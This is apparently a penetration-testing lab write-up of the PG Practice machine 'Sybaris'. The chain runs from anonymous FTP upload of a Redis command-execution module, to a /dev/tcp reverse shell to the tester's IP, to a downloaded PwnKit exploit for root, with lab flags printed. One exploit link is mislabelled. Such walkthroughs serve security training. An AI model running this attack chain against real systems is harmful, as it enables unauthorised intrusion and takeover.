###### tags: `Offsec` `PG Practice` `Intermediate` `Linux`

# Sybaris
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rustscan -a 192.168.176.93 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 192.168.176.93:21
Open 192.168.176.93:22
Open 192.168.176.93:80
Open 192.168.176.93:6379

PORT     STATE SERVICE REASON  VERSION
21/tcp   open  ftp     syn-ack vsftpd 3.0.2
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 192.168.45.196
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxrwxrwx    2 0        0               6 Apr 01  2020 pub [NSE: writeable]
22/tcp   open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/7.3.22)
| http-robots.txt: 11 disallowed entries 
| /config/ /system/ /themes/ /vendor/ /cache/ 
| /changelog.txt /composer.json /composer.lock /composer.phar /search/ 
|_/admin/
|_http-title: Sybaris - Just another HTMLy blog
|_http-generator: HTMLy v2.7.5
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.22
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-methods: 
|_  Supported Methods: GET POST
|_http-favicon: Unknown favicon MD5: A4DA8778FE902EB34FD9A5D4C0A832E1
6379/tcp open  redis   syn-ack Redis key-value store 5.0.9
Service Info: OS: Unix
```

參考之前所遇到的[6379 - Pentesting Redis](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#load-redis-module)的部分，先去[RedisModules-ExecuteCommand
](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)下載之後進行`make`，然後上傳到ftp裡面進行`load`
```
┌──(kali㉿kali)-[~/pgplay/RedisModules-ExecuteCommand]
└─$ make

┌──(kali㉿kali)-[~/pgplay/redis-rce]
└─$ ftp 192.168.176.93
Name (192.168.176.93:kali): anonymous
331 Please specify the password.
Password: 
230 Login successful.
ftp> cd pub
250 Directory successfully changed.
ftp> put module.so
```

`load module`之後開啟nc，等反彈，在`/home/pablo`可得proof.txt
```
┌──(kali㉿kali)-[~/pgplay]
└─$ rlwrap -cAr nc -nvlp22

┌──(kali㉿kali)-[~/pgplay]
└─$ redis-cli -h 192.168.176.93
192.168.176.93:6379> MODULE LOAD /var/ftp/pub/module.so
OK
192.168.176.93:6379> system.exec "id"
"uid=1000(pablo) gid=1000(pablo) groups=1000(pablo)\n"
192.168.176.93:6379> system.exec "/bin/sh -i >& /dev/tcp/192.168.45.196/22 0>&1"

python -c 'import pty; pty.spawn("/bin/bash")'
[pablo@sybaris ~]$ cat local.txt
f4d9f938e00a3af37f4891bb0fd72e44
```

`linpeas.sh`，用[CVE-2021-4034](https://github.com/worawit/CVE-2021-3156?tab=readme-ov-file)使用之後得root，在/root得proof.txt
```
[pablo@sybaris ~]$ wget 192.168.45.196/linpeas.sh
[pablo@sybaris ~]$ chmod +x linpeas.sh
[pablo@sybaris ~]$ ./linpeas.sh

...
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: less probable
   Tags: ubuntu=10|11|12|13|14|15|16|17|18|19|20|21,debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main
...

[pablo@sybaris ~]$ wget 192.168.45.196/CVE-2021-4034.py
[pablo@sybaris ~]$ python CVE-2021-4034.py
python CVE-2021-4034.py
[+] Creating shared library for exploit code.
[+] Calling execve()
[root@sybaris root]# cat proof.txt
2a735250c280571e99972bb23c8960c3
```